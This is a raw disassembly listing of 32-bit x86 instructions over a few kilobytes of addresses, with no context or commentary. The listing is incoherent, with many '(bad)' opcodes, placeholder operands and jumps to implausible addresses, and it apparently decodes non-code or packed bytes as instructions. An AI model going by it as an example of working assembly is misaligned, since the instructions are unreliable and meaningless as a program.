  415844:	jb     0x415857
  415846:	inc    ecx
  415847:	xchg   ebp,eax
  415848:	jmp    0x1fc931ae
  41584d:	dec    edi
  41584e:	adc    eax,0xe5e60d25
  415853:	sti    
  415854:	ds in  eax,0x55
  415857:	cld    
  415858:	bound  eax,QWORD PTR [esi]
  41585a:	fcom   QWORD PTR [ebp+0x25152e29]
  415860:	cli    
  415861:	and    eax,0x44650c99
  415866:	stos   BYTE PTR es:[edi],al
  415867:	cld    
  415868:	jmp    0x16ca051d
  41586d:	cvtps2pi mm4,QWORD PTR ds:0x752cb300
  415874:	and    al,0x83
  415876:	pop    eax
  415877:	call   0x5571d4f0
  41587c:	and    al,0x93
  41587e:	cs enter 0x15e8,0xac
  415883:	cld    
  415884:	call   eax
  415886:	fsub   DWORD PTR [eax+ebx*1]
  415889:	jb     0x41585c
  41588b:	and    al,0x14
  41588d:	mov    bh,0x8c
  41588f:	xchg   DWORD PTR [edi+edx*2-0x7f],edx
  415893:	mov    bl,0x8a
  415895:	dec    ebx
  415896:	fld    QWORD PTR [eax]
  415898:	call   0x3f2131
  41589d:	mov    gs,eax
  41589f:	and    al,0x2c
  4158a1:	cld    
  4158a2:	fsub   DWORD PTR [esp+edx*1]
  4158a5:	add    BYTE PTR [ebx+0x22],bl
  4158a8:	inc    ebp
  4158a9:	and    al,0x57
  4158ab:	ret    
  4158ac:	or     al,0x50
  4158ae:	jecxz  0x4158f2
  4158b0:	sbb    BYTE PTR [edx],al
  4158b2:	sti    
  4158b3:	pop    ebx
  4158b4:	lds    edx,FWORD PTR [eax]
  4158b6:	mov    ?,eax
  4158b8:	and    al,0x28
  4158ba:	jle    0x4158ac
  4158bc:	and    al,0x4c
  4158be:	jecxz  0x415845
  4158c0:	add    eax,DWORD PTR [eax]
  4158c2:	sti    
  4158c3:	jmp    0x4158c2
  4158c5:	adc    eax,0x3caabb
  4158ca:	inc    esi
  4158cb:	jae    0x4158db
  4158cd:	test   BYTE PTR [eax],bh
  4158cf:	fadd   QWORD PTR [eax]
  4158d1:	add    BYTE PTR [eax],bh
  4158d3:	push   esp
  4158d4:	cld    
  4158d5:	jge    0x4158d4
  4158d7:	and    ecx,ecx
  4158d9:	sub    DWORD PTR [edx],0x3b0000dd
  4158df:	aad    0xff
  4158e1:	dec    eax
  4158e2:	cmp    BYTE PTR [ebp-0x5],ah
  4158e5:	inc    ecx
  4158e6:	test   cl,0x93
  4158e9:	sub    esp,DWORD PTR [edx-0xc]
  4158ec:	mov    ah,0xf8
  4158ee:	fstp   TBYTE PTR [esi-0x24]
  4158f1:	sub    ecx,DWORD PTR [edi]
  4158f3:	mov    dh,0x77
  4158f5:	lds    ecx,FWORD PTR [ecx-0x75378841]
  4158fb:	adc    eax,0x396dffc5
  415900:	cmp    al,0x24
  415902:	xor    dh,BYTE PTR ds:0x2bad74c5
  415908:	mov    ch,0x89
  41590a:	add    BYTE PTR [ecx],ch
  41590c:	call   0xc07c:0xb2601695
  415913:	into   
  415914:	fnstenv [ebx+0x44]
  415917:	xchg   BYTE PTR [edx-0x3872aad0],bh
  41591d:	test   DWORD PTR [esi+eax*4+0x62000556],esi
  415924:	sub    eax,0xefa22441
  415929:	xor    al,0xfd
  41592b:	outs   dx,DWORD PTR ds:[esi]
  41592c:	sub    dh,ch
  41592e:	aas    
  41592f:	bound  esi,QWORD PTR [ebx]
  415931:	(bad)  
  415932:	dec    DWORD PTR [esi+0x465479b9]
  415938:	mov    edx,0x8e3e4c79
  41593d:	cwde   
  41593e:	aad    0x56
  415940:	mov    ah,0x0
  415942:	mov    edx,ebp
  415944:	adc    DWORD PTR ds:[esi+edi*2],esp
  415948:	pop    es
  415949:	in     al,dx
  41594a:	sbb    esi,DWORD PTR [ecx+0x72]
  41594d:	add    BYTE PTR [ecx-0x182b21e2],cl
  415953:	dec    edx
  415954:	icebp  
  415955:	(bad)  
  415956:	(bad)  
  415957:	out    dx,eax
  415958:	dec    ebp
  415959:	fsub   QWORD PTR [ebx-0x5]
  41595c:	add    BYTE PTR ds:0xaf1a6200,al
  415962:	popa   
  415963:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415964:	fsub   DWORD PTR [edx]
  415966:	ja     0x41599e
  415968:	std    
  415969:	fisttp QWORD PTR [edx-0x8]
  41596c:	fsubr  st,st(1)
  41596e:	add    eax,DWORD PTR [eax]
  415970:	jp     0x41590e
  415972:	xchg   DWORD PTR [edi+eax*4+0x5ddf9e53],eax
  415979:	(bad)
  41597e:	pop    esi
  41597f:	ret    
  415980:	loope  0x415929
  415982:	fstp   TBYTE PTR [esi]
  415984:	lahf   
  415985:	or     BYTE PTR [edi-0x3e],ch
  415988:	loope  0x415915
  41598a:	jmp    0x4159ca
  41598c:	and    BYTE PTR [edx],cl
  41598e:	gs aas 
  415990:	xchg   BYTE PTR ds:0x6ddb8d65,bl
  415996:	push   cs
  415997:	test   al,0x62
  415999:	fldl2t 
  41599b:	hlt    
  41599c:	mov    al,ds:0xb6851991
  4159a1:	std    
  4159a2:	cmc    
  4159a3:	jbe    0x415943
  4159a5:	std    
  4159a6:	sbb    eax,0xd5fd9685
  4159ab:	test   BYTE PTR [esi+0xf3425fd],cl
  4159b1:	lock mov ch,dh
  4159b4:	jne    0x415981
  4159b6:	sub    DWORD PTR [edx+edx*4],eax
  4159b9:	setb   BYTE PTR [ebp+0x59]
  4159bd:	fucomi st,st(1)
  4159bf:	and    BYTE PTR [esi],0xfe
  4159c2:	pop    esi
  4159c3:	mov    ah,0xfa
  4159c5:	shr    DWORD PTR [eax],1
  4159c7:	add    ah,BYTE PTR [edx+0x52]
  4159ca:	(bad)  
  4159cc:	adc    DWORD PTR [edx+0x1d],0xea197338
  4159d3:	sub    al,0x0
  4159d5:	(bad)  
  4159d6:	pop    DWORD PTR [ebx+0xf]
  4159d9:	xchg   ch,cl
  4159db:	cmp    ch,BYTE PTR [ebp+0x1f01a611]
  4159e1:	out    0x2d,al
  4159e3:	and    eax,0x508fdf09
  4159e8:	es iret 
  4159ea:	push   ebx
  4159eb:	inc    ebp
  4159ec:	lds    edx,FWORD PTR [edx+0x3ab45b05]
  4159f2:	lds    edx,FWORD PTR es:[ecx+0x61]
  4159f6:	fld    DWORD PTR [eax]
  4159f8:	sub    esi,DWORD PTR [ebp-0x5a]
  4159fb:	or     DWORD PTR ds:0xe900db25,0x31254cea
  415a05:	arpl   cx,bx
  415a07:	add    BYTE PTR [edx],bl
  415a09:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415a0a:	pop    esi
  415a0b:	add    eax,0x255ce505
  415a10:	xchg   ebp,eax
  415a11:	fld    DWORD PTR fs:[eax]
  415a14:	push   0xffffff9e
  415a16:	cmc    
  415a17:	mov    DWORD PTR ds:0x6c50d58a,esi
  415a1d:	sar    ah,cl
  415a1f:	mov    al,0xe9
  415a21:	popa   
  415a22:	fld1   
  415a24:	push   esp
  415a25:	cmp    ah,BYTE PTR [ebp-0x2b599304]
  415a2b:	test   dh,cl
  415a2d:	pop    edi
  415a2e:	fld    DWORD PTR [eax]
  415a30:	aas    
  415a31:	repz pop esp
  415a33:	and    eax,0xd95e59
  415a38:	sbb    DWORD PTR [eax],eax
  415a3a:	pop    ss
  415a3b:	push   ebx
  415a3c:	dec    ebp
  415a3d:	lds    esp,FWORD PTR [ebp-0x4f]
  415a40:	xor    al,0x87
  415a42:	data16 fld DWORD PTR [edi-0x7b22c20b]
  415a49:	sub    DWORD PTR [ecx+0x5d],esi
  415a4c:	push   es
  415a4d:	jmp    0x415ab0
  415a4f:	fld    DWORD PTR [edi+0x2514f2ef]
  415a55:	loope  0x415a05
  415a57:	or     edi,esp
  415a59:	add    BYTE PTR [ebx],bl
  415a5b:	popa   
  415a5c:	add    DWORD PTR [eax],eax
  415a5e:	retf   
  415a5f:	push   eax
  415a60:	ror    DWORD PTR [edi],0x3e
  415a63:	sub    bh,ah
  415a65:	(bad)  
  415a66:	mov    ebx,0x93244556
  415a6b:	dec    eax
  415a6c:	push   ebp
  415a6d:	and    al,0x7f
  415a6f:	push   esi
  415a70:	or     DWORD PTR [edx-0x35],edx
  415a73:	pop    edx
  415a74:	dec    esp
  415a75:	sbb    al,0xfe
  415a77:	sbb    al,0xe
  415a79:	test   DWORD PTR ds:0xd80000dc,esi
  415a7f:	dec    eax
  415a80:	push   ebp
  415a81:	and    al,0xa7
  415a83:	mov    BYTE PTR fs:[eax],al
  415a86:	jnp    0x415a61
  415a88:	call   0xfe9a043d
  415a8d:	mov    ecx,DWORD PTR [edi+0x346a08f1]
  415a93:	mov    bh,0xe
  415a95:	lea    esp,[edi-0xf]
  415a98:	xor    al,0xe8
  415a9a:	jae    0x415a60
  415a9c:	(bad)  
  415a9d:	inc    DWORD PTR [eax]
  415a9f:	hlt    
  415aa0:	lods   al,BYTE PTR ds:[esi]
  415aa1:	and    BYTE PTR [eax],cl
  415aa3:	rol    BYTE PTR [eax],0xf6
  415aa6:	fist   DWORD PTR [ecx]
  415aa8:	add    al,0xfe
  415aaa:	adc    eax,0x40cc57
  415aaf:	cmc    
  415ab0:	sbb    ecx,DWORD PTR [esi]
  415ab2:	test   BYTE PTR [esi+0x280000dd],cl
  415ab8:	sbb    DWORD PTR [esi-0x73],edx
  415abb:	pop    edi
  415abc:	icebp  
  415abd:	xor    BYTE PTR [ecx+0xd885],bh
  415ac3:	sbb    BYTE PTR [eax+eiz*1+0x62aee30c],0xff
  415acb:	inc    esp
  415acc:	push   ebx
  415acd:	inc    ebp
  415ace:	and    al,0xdb
  415ad0:	dec    ecx
  415ad1:	push   ebp
  415ad2:	and    al,0x62
  415ad4:	fimul  WORD PTR [ebx-0x2bfacff8]
  415ada:	and    esi,DWORD PTR [esi+0x40]
  415add:	sar    ah,1
  415adf:	ror    DWORD PTR [esi],cl
  415ae1:	add    BYTE PTR [eax],al
  415ae3:	bound  esi,QWORD PTR ds:0x37537340
  415ae9:	int3   
  415aea:	and    ecx,DWORD PTR [esi-0x36]
  415aed:	push   ebx
  415aee:	out    dx,al
  415aef:	bound  esi,QWORD PTR [edx+0x4edbf88b]
  415af5:	and    al,0x14
  415af7:	jns    0x415ab3
  415af9:	xor    eax,eax
  415afb:	jmp    0x3e85e7da
  415b00:	mov    ds,ecx
  415b02:	mov    al,BYTE PTR [eax]
  415b04:	push   ss
  415b05:	xchg   esi,eax
  415b06:	aam    0xb6
  415b08:	aad    0xb2
  415b0a:	add    BYTE PTR [eax],al
  415b0c:	dec    edx
  415b0d:	retf   
  415b0e:	loop   0x415b0c
  415b10:	push   ebp
  415b11:	daa    
  415b12:	leave  
  415b13:	and    esi,DWORD PTR [esi+0x3d]
  415b16:	fldenv [ebx]
  415b18:	jbe    0x415b51
  415b1a:	or     eax,0x28c5ef52
  415b1f:	pop    eax
  415b20:	nop
  415b21:	ret    0x8f81
  415b24:	(bad)  
  415b25:	mov    cl,0x0
  415b27:	add    bh,bl
  415b29:	jno    0x415b1f
  415b2b:	or     cl,ch
  415b2d:	in     eax,dx
  415b2e:	sub    BYTE PTR [edx+ecx*1],ch
  415b31:	and    DWORD PTR [edi+0x0],ebp
  415b34:	bound  edx,QWORD PTR [edi+0x3]
  415b37:	xor    DWORD PTR [edx],esp
  415b39:	add    eax,0x197e23d9
  415b3e:	xchg   ebp,eax
  415b3f:	add    BYTE PTR [edx-0x4e],ah
  415b42:	(bad)  
  415b43:	call   0xfd217e42
  415b48:	in     eax,0x36
  415b4a:	shl    DWORD PTR [ebx],1
  415b4c:	jle    0x415b27
  415b4e:	outs   dx,BYTE PTR ds:[esi]
  415b4f:	ret    
  415b50:	popa   
  415b51:	bound  esp,QWORD PTR [edx]
  415b53:	mov    ds:0x446cd922,al
  415b58:	dec    esi
  415b59:	aad    0x16
  415b5b:	push   esi
  415b5c:	inc    esp
  415b5d:	loop   0x415b38
  415b5f:	mov    ebp,0x3aa436e
  415b64:	xor    edi,edx
  415b66:	pop    esi
  415b67:	push   ebx
  415b68:	add    bl,bl
  415b6a:	cdq    
  415b6b:	outs   dx,DWORD PTR gs:[esi]
  415b6d:	outs   dx,DWORD PTR ds:[esi]
  415b6e:	push   ds
  415b6f:	sub    eax,0xeba3e0d4
  415b74:	(bad)  
  415b75:	sahf   
  415b76:	or     DWORD PTR [eax+0x61fcde8e],edi
  415b7c:	add    al,0x62
  415b7e:	fstp   DWORD PTR [ecx-0x3602e172]
  415b84:	rol    DWORD PTR [ebp+0x6205cf9d],cl
  415b8a:	pop    eax
  415b8b:	es sbb bl,ch
  415b8e:	mov    eax,ds:0xc181f7e3
  415b93:	ficom  DWORD PTR [esi]
  415b95:	sahf   
  415b96:	(bad)  
  415b97:	sub    DWORD PTR [ecx+esi*4],eax
  415b9a:	mov    ds:0x1952cff5,al
  415b9f:	jmp    0xe14c:0x73d32234
  415ba6:	mov    ds:0x5e1dd1e3,al
  415bab:	mov    eax,ds:0xea45e610
  415bb0:	add    esp,DWORD PTR [edx+0x54]
  415bb3:	sub    BYTE PTR ss:[edx+0x60],al
  415bb7:	jno    0x415bbc
  415bb9:	(bad)  
  415bba:	fld    DWORD PTR [ecx-0x7c5d627b]
  415bc0:	mov    WORD PTR [esi-0x59712203],es
  415bc6:	std    
  415bc7:	add    cl,bl
  415bc9:	adc    DWORD PTR [esi+0x7900c575],esp
  415bcf:	dec    esi
  415bd0:	jle    0x415bc3
  415bd2:	mov    edx,0x92054d4f
  415bd7:	mov    cl,0x1b
  415bd9:	push   ebp
  415bda:	loop   0x415b80
  415bdc:	xor    BYTE PTR [eax],ah
  415bde:	push   edx
  415bdf:	imul   ebx,edx,0xffffffa8
  415be2:	fstp   QWORD PTR [ecx+0x4e08a40c]
  415be8:	push   ebp
  415be9:	or     eax,0xe9996a7e
  415bee:	popa   
  415bef:	fld1   
  415bf1:	mov    dh,0x80
  415bf3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415bf4:	cld    
  415bf5:	ins    BYTE PTR es:[edi],dx
  415bf6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415bf7:	not    BYTE PTR [eax]
  415bf9:	mov    ecx,0xf1252de2
  415bfe:	in     al,dx
  415bff:	adc    eax,0xba9ad125
  415c04:	out    dx,eax
  415c05:	add    ah,dl
  415c07:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415c08:	test   DWORD PTR [ecx],ebp
  415c0a:	ins    DWORD PTR es:[edi],dx
  415c0b:	fdivr  st,st(2)
  415c0d:	sub    ch,ah
  415c0f:	or     al,0x25
  415c11:	or     DWORD PTR [edi],edx
  415c13:	dec    esp
  415c14:	add    ecx,ebp
  415c16:	popa   
  415c17:	mov    cl,0x29
  415c19:	dec    eax
  415c1a:	lds    esp,FWORD PTR [esi+ecx*4+0x50c98a25]
  415c21:	(bad)  
  415c22:	cmp    dh,dh
  415c24:	sbb    BYTE PTR [edx+edx*1-0xa],ch
  415c28:	sub    BYTE PTR [esi],bl
  415c2a:	mov    dh,0x90
  415c2c:	clc    
  415c2d:	scas   al,BYTE PTR es:[edi]
  415c2e:	popf   
  415c2f:	pop    ebp
  415c30:	rcr    DWORD PTR ds:0xc0a36000,0x65
  415c37:	test   eax,0x2a620b2d
  415c3c:	not    BYTE PTR [eax]
  415c3e:	add    edi,DWORD PTR [ebp+0x4e]
  415c41:	dec    esi
  415c42:	add    BYTE PTR [edi],al
  415c44:	cs dec edi
  415c46:	adc    bh,cl
  415c48:	aad    0x89
  415c4a:	dec    esp
  415c4b:	pop    ss
  415c4c:	(bad)  
  415c4d:	call   0x11de9de
  415c52:	pop    ebp
  415c53:	pushf  
  415c54:	jle    0x415bdf
  415c56:	inc    esp
  415c57:	addr16 aad 0x50
  415c5a:	mov    eax,ebx
  415c5c:	and    cl,BYTE PTR [eax+ecx*1+0x46]
  415c60:	sub    esi,DWORD PTR [ebp+0x6]
  415c63:	xor    bl,bl
  415c65:	push   edx
  415c66:	dec    ebx
  415c68:	int    0x5a
  415c6a:	xor    edi,DWORD PTR [ebx+0x5c]
  415c6d:	lds    esi,FWORD PTR [ecx+ecx*4-0x6c3dff2b]
  415c74:	aad    0x4f
  415c76:	mov    ebx,DWORD PTR [edi+0x5c]
  415c79:	in     eax,dx
  415c7a:	pushf  
  415c7b:	jns    0x415c52
  415c7d:	add    BYTE PTR [ebx+0x1],dl
  415c80:	add    al,0x32
  415c82:	leave  
  415c83:	pop    es
  415c84:	dec    BYTE PTR ds:0x558b3a95
  415c8a:	lea    eax,[esi]
  415c8c:	lods   eax,DWORD PTR ds:[esi]
  415c8d:	std    
  415c8e:	dec    DWORD PTR [eax+ebx*1+0x40]
  415c92:	in     al,dx
  415c93:	scas   eax,DWORD PTR es:[edi]
  415c94:	aas    
  415c95:	inc    ecx
  415c96:	add    BYTE PTR [eax],al
  415c98:	mov    edx,0x3b008315
  415c9d:	fucomp st(0)
  415c9f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415ca0:	stos   DWORD PTR es:[edi],eax
  415ca1:	and    dh,bh
  415ca3:	lea    edx,[esi+0x5]
  415ca6:	mov    ah,0x88
  415ca8:	cmp    ebx,ebp
  415caa:	add    al,ch
  415cac:	test   BYTE PTR [ebp+edi*8+0x6951beff],bh
  415cb3:	std    
  415cb4:	mov    esp,0x7e504c1f
  415cb9:	xchg   ecx,eax
  415cba:	int3   
  415cbb:	mov    edi,0xb162
  415cc0:	loop   0x415ca4
  415cc2:	xchg   ecx,eax
  415cc3:	xchg   ebx,eax
  415cc4:	jb     0x415d1d
  415cc6:	jnp    0x415cc5
  415cc8:	fldcw  WORD PTR [edi+0x68]
  415ccb:	add    ebp,DWORD PTR [eax+0x27]
  415cce:	jnp    0x415c53
  415cd0:	mov    ds:0x62c7847f,al
  415cd5:	mov    dl,0x0
  415cd7:	or     edx,0xa2840aff
  415cdd:	mov    dl,0x0
  415cdf:	add    BYTE PTR [ecx+0x8],dh
  415ce2:	xchg   ecx,eax
  415ce3:	push   ebx
  415ce4:	sahf   
  415ce5:	pop    ecx
  415ce6:	lea    eax,[eax]
  415ce8:	bound  esi,QWORD PTR [edx+0x1ab2738d]
  415cee:	(bad)  
  415cef:	pop    edi
  415cf0:	popf   
  415cf1:	out    dx,eax
  415cf2:	nop
  415cf3:	inc    ebx
  415cf4:	xchg   esi,eax
  415cf5:	(bad)  
  415cf6:	jmp    0x70:0x892d37fe
  415cfd:	test   edi,eax
  415cff:	jp     0x415d51
  415d01:	adc    eax,0xebfc0139
  415d06:	sbb    eax,0xaa57fd78
  415d0b:	adc    BYTE PTR [eax+0x62],al
  415d0e:	sub    eax,0xfd707340
  415d13:	enter  0xb2f7,0xe0
  415d17:	mov    edx,DWORD PTR [ebx+0x26]
  415d1a:	sub    eax,0xde3afbcc
  415d1f:	stc    
  415d20:	cld    
  415d21:	cmp    eax,0x2a81029b
  415d26:	xchg   edi,eax
  415d27:	mov    BYTE PTR [ebx+0x36],al
  415d2a:	xor    edi,DWORD PTR [ebp-0x3]
  415d2d:	scas   eax,DWORD PTR es:[edi]
  415d2e:	sub    dl,0x7
  415d31:	out    dx,eax
  415d32:	hlt    
  415d33:	js     0x415d8b
  415d35:	mov    dl,0xd9
  415d37:	mov    ds:0x29c78617,al
  415d3c:	add    al,0xe3
  415d3e:	xchg   esp,eax
  415d3f:	out    0x8e,al
  415d41:	xchg   ecx,eax
  415d42:	dec    ecx
  415d43:	push   ecx
  415d44:	xchg   DWORD PTR [edx-0x27],esp
  415d47:	jmp    0x7b4146b7
  415d4c:	jge    0x415d27
  415d4e:	adc    eax,0xb1218b5a
  415d53:	pop    ebp
  415d54:	(bad)  
  415d55:	leave  
  415d56:	push   ecx
  415d57:	lods   eax,DWORD PTR ds:[esi]
  415d58:	push   ebx
  415d59:	fst    DWORD PTR [ebp-0x2e]
  415d5c:	jle    0x415d25
  415d5e:	lahf   
  415d5f:	popa   
  415d60:	mov    DWORD PTR [eax],0x6ba54d91
  415d66:	fst    QWORD PTR ds:0x30e18f26
  415d6c:	cmp    eax,0x6508a77d
  415d71:	iret   
  415d72:	lods   eax,DWORD PTR ds:[esi]
  415d73:	xchg   edi,eax
  415d74:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415d75:	pop    ebx
  415d76:	popa   
  415d77:	fldl2t 
  415d79:	add    esp,DWORD PTR [edi+0x62030a15]
  415d7f:	fldl2t 
  415d81:	inc    esp
  415d82:	and    DWORD PTR [ebp-0x269dfc18],esi
  415d88:	adc    DWORD PTR [edi+0x4f],edi
  415d8b:	fucomi st,st(1)
  415d8d:	xor    BYTE PTR [eax-0xef2f0ac],dl
  415d93:	fwait
  415d94:	cdq    
  415d95:	mov    BYTE PTR [ecx-0x24be9657],ch
  415d9b:	fldl2t 
  415d9d:	add    edi,DWORD PTR [edx]
  415d9f:	and    bl,cl
  415da1:	jl     0x415de2
  415da3:	jmp    FWORD PTR [ebx]
  415da5:	fstp   DWORD PTR [ebx+ebx*4]
  415da8:	imul   ebp,DWORD PTR [edi-0x22],0xd903e9db
  415daf:	add    eax,0xa260d01
  415db4:	push   esi
  415db5:	pop    ss
  415db6:	das    
  415db7:	xor    DWORD PTR [ebp+0x40],edi
  415dba:	jle    0x415e0e
  415dbc:	pop    esp
  415dbd:	sahf   
  415dbe:	xchg   BYTE PTR [edx-0x7b],dl
  415dc1:	int    0xd1
  415dc3:	fld    DWORD PTR [eax]
  415dc5:	jmp    0x30506dca
  415dca:	mov    ds:0xc5555412,al
  415dcf:	add    eax,0x61e8ff68
  415dd4:	pop    ecx
  415dd5:	jmp    0xfcdf3748
  415dda:	push   0x49
  415ddc:	pushf  
  415ddd:	or     al,0x65
  415ddf:	sahf   
  415de0:	fadd   DWORD PTR [eax]
  415de2:	jmp    0x654df7cb
  415de7:	jbe    0x415dc4
  415de9:	add    cl,ch
  415deb:	fcom   QWORD PTR [ebp+0x25]
  415dee:	pop    ecx
  415def:	popa   
  415df0:	fld    DWORD PTR [eax]
  415df2:	cdq    
  415df3:	push   ds
  415df4:	retf   0xdb6c
  415df7:	mov    eax,ds:0xd811879e
  415dfc:	sub    eax,0xb2dca925
  415e01:	or     al,0x6d
  415e03:	inc    edx
  415e04:	fild   DWORD PTR [eax]
  415e06:	jmp    0x9dcf8196
  415e0b:	inc    ebp
  415e0c:	or     eax,0xfef3115a
  415e11:	sti    
  415e12:	imul   bh
  415e14:	adc    al,0x25
  415e16:	mov    eax,ds:0xfcfc0b31
  415e1b:	xchg   ecx,eax
  415e1c:	retf   
  415e1d:	inc    eax
  415e1e:	jmp    0x6d4df705
  415e23:	mov    edx,0xce9fc9e
  415e28:	or     DWORD PTR [esi-0x6890000],ecx
  415e2e:	sbb    al,0x51
  415e30:	mov    dh,0x91
  415e32:	and    BYTE PTR [eax],dh
  415e34:	jp     0x415e58
  415e36:	rol    DWORD PTR [ebp-0x19802e35],1
  415e3c:	cli    
  415e3d:	fld    DWORD PTR [eax]
  415e3f:	mov    edi,DWORD PTR [edi]
  415e41:	stc    
  415e42:	and    al,0x8d
  415e44:	aas    
  415e45:	stc    
  415e46:	cmp    BYTE PTR [ebx+0x54878403],cl
  415e4c:	pop    ds
  415e4d:	call   0x2420:0x81725052
  415e54:	push   esp
  415e55:	test   BYTE PTR [eax-0x7b],ah
  415e58:	or     edx,edx
  415e5a:	jg     0x415e03
  415e5c:	mov    edx,0xff8b00d9
  415e61:	mov    ebp,0xbdff8d24
  415e66:	xor    BYTE PTR [ebx+0x548783c3],cl
  415e6c:	pop    edi
  415e6d:	lea    edx,[edx+0x6a]
  415e70:	mov    eax,DWORD PTR [esi-0x72908b03]
  415e76:	std    
  415e77:	je     0x415ed8
  415e79:	test   DWORD PTR [edi+edi*8-0x36],ecx
  415e7d:	loope  0x415efe
  415e7f:	shl    BYTE PTR [eax+ebx*2+0x6f],0x1
  415e84:	mov    ebx,ecx
  415e86:	cmp    DWORD PTR [edi+ebx*4+0x5d],0x7ffe0f00
  415e8e:	sti    
  415e8f:	inc    DWORD PTR [eax]
  415e91:	jnp    0x415ee1
  415e93:	inc    ebp
  415e94:	and    al,0x1b
  415e96:	push   edx
  415e97:	push   ebp
  415e98:	and    al,0x2b
  415e9a:	dec    esp
  415e9b:	or     DWORD PTR [edx-0x4d],edx
  415e9e:	aad    0x0
  415ea0:	and    BYTE PTR [ebx],bh
  415ea2:	mov    ebp,edi
  415ea4:	push   ecx
  415ea5:	(bad)  
  415ea6:	retf   0xc081
  415ea9:	gs xor eax,0xb32dfec5
  415eaf:	mov    eax,DWORD PTR [esi+edi*2-0x2e]
  415eb3:	mov    DWORD PTR [esi+eax*2-0x6],edx
  415eb7:	mov    ecx,DWORD PTR [eax]
  415eb9:	mov    al,0xbf
  415ebb:	aam    0xfc
  415ebd:	mov    bl,0x8e
  415ebf:	add    eax,0xff173555
  415ec5:	std    
  415ec6:	mov    dl,0x8b
  415ec8:	inc    esp
  415ec9:	ds xchg edx,eax
  415ecb:	mov    DWORD PTR [esi+eax*2-0x76],edx
  415ecf:	mov    ecx,DWORD PTR [eax]
  415ed1:	nop
  415ed2:	mov    edi,0xc2867477
  415ed7:	aam    0xfc
  415ed9:	xor    edi,DWORD PTR [esi+0x2d5dc081]
  415edf:	add    edi,edi
  415ee1:	lds    esi,FWORD PTR [edx-0x25798b75]
  415ee7:	lea    ebx,[esi+edi*2-0x3a]
  415eeb:	cmp    eax,0x682c5d1e
  415ef0:	add    BYTE PTR [edx-0x4e],ah
  415ef3:	mov    edi,ecx
  415ef5:	add    bl,ch
  415ef7:	inc    esi
  415ef8:	sbb    al,0x2c
  415efa:	pop    ebx
  415efb:	dec    esi
  415efc:	das    
  415efd:	or     BYTE PTR [ebp+0x2c],bl
  415f00:	scas   al,BYTE PTR es:[edi]
  415f01:	add    BYTE PTR [edx-0x4e],ah
  415f04:	mov    eax,ecx
  415f06:	jmp    0x415f76
  415f08:	sbb    al,0x1c
  415f0a:	jmp    0x614d8e2d
  415f0f:	retf   0x5c87
  415f12:	ds jg  0x415ea0
  415f15:	inc    ebx
  415f16:	bound  edx,QWORD PTR [ebp+0x6261001a]
  415f1c:	in     al,dx
  415f1d:	and    DWORD PTR [edx-0x440ca327],ebx
  415f23:	sbb    ebx,ebx
  415f25:	out    dx,eax
  415f26:	gs pushf 
  415f28:	std    
  415f29:	xchg   DWORD PTR [ebx+0x19],edx
  415f2c:	jmp    0x918d:0x4825227e
  415f33:	ror    DWORD PTR [edi+0x79],1
  415f36:	jmp    0xa596d47
  415f3b:	xor    bl,bl
  415f3d:	add    eax,0xede4b062
  415f42:	inc    ebp
  415f43:	pushf  
  415f44:	adc    eax,0x69c5ff0c
  415f49:	adc    eax,0x4464d9a2
  415f4e:	jbe    0x415f68
  415f50:	outs   dx,DWORD PTR ds:[esi]
  415f51:	iret   
  415f52:	pop    ebp
  415f53:	or     BYTE PTR [eax],dl
  415f55:	jns    0x415eea
  415f57:	xchg   edx,eax
  415f58:	or     BYTE PTR [edx+0x0],0xd7
  415f5c:	fldl2t 
  415f5e:	mov    WORD PTR [edx+0x54f05555],?
  415f64:	das    
  415f65:	pop    ebx
  415f66:	lea    edx,[ecx+0x561fa64d]
  415f6c:	mov    cl,0x12
  415f6e:	or     DWORD PTR [eax-0x27],esp
  415f71:	jno    0x415f33
  415f73:	or     eax,0x288a476e
  415f79:	outs   dx,DWORD PTR ds:[esi]
  415f7a:	add    esp,DWORD PTR [edx+0x4f]
  415f7d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415f7e:	pop    ds
  415f7f:	jae    0x415fd6
  415f81:	sub    dh,al
  415f83:	push   ebp
  415f84:	das    
  415f85:	jmp    0xaa7c9647
  415f8a:	add    ebp,ecx
  415f8c:	or     al,0xc6
  415f8e:	pop    ss
  415f8f:	jp     0x415f56
  415f91:	repnz add eax,0x1fa65062
  415f97:	mov    ss,WORD PTR [esi+0x1]
  415f9a:	lods   eax,DWORD PTR ds:[esi]
  415f9b:	jne    0x415f5a
  415f9d:	adc    BYTE PTR [ecx-0xecbea72],ch
  415fa3:	fcom   DWORD PTR ds:0x15ef0d25
  415fa9:	and    eax,0x5d576af5
  415fae:	into   
  415faf:	stos   BYTE PTR es:[edi],al
  415fb0:	pushf  
  415fb1:	mov    BYTE PTR ds:0x35fbc582,ch
  415fb7:	push   ebx
  415fb8:	int    0x87
  415fba:	loope  0x415fed
  415fbc:	sahf   
  415fbd:	push   edx
  415fbe:	rol    DWORD PTR [eax],1
  415fc0:	ficom  WORD PTR ds:0x25d6dd25
  415fc6:	and    eax,0xc45a21d1
  415fcb:	in     eax,0xe8
  415fcd:	adc    eax,0xd32ed525
  415fd2:	or     ebp,DWORD PTR [ebx+0x3f]
  415fd5:	pushf  
  415fd6:	cld    
  415fd7:	jle    0x415fc7
  415fd9:	std    
  415fda:	and    al,0xd1
  415fdc:	out    0x2d,al
  415fde:	and    eax,0x2515df29
  415fe3:	std    
  415fe4:	mov    bl,0x51
  415fe6:	or     DWORD PTR [ecx+0x62190a3a],edi
  415fec:	cmc    
  415fed:	mul    BYTE PTR [eax]
  415fef:	mov    ecx,0x98fbd1de
  415ff4:	pop    ecx
  415ff5:	push   eax
  415ff6:	inc    ebp
  415ff7:	add    eax,0xe1880956
  415ffc:	sbb    cl,BYTE PTR [edx]
  415ffe:	or     DWORD PTR [edx-0x33],esp
  416001:	not    BYTE PTR [esi+eiz*1]
  416004:	jne    0x415ffc
  416006:	cmp    BYTE PTR [edx+0x69],dh
  416009:	or     esp,edi
  41600b:	mov    eax,0xc5455059
  416010:	dec    ebp
  416011:	or     DWORD PTR [eax+0x4f218b00],ecx
  416017:	or     al,dl
  416019:	pop    edx
  41601a:	and    BYTE PTR [ebx+edi*8],dl
  41601d:	dec    esp
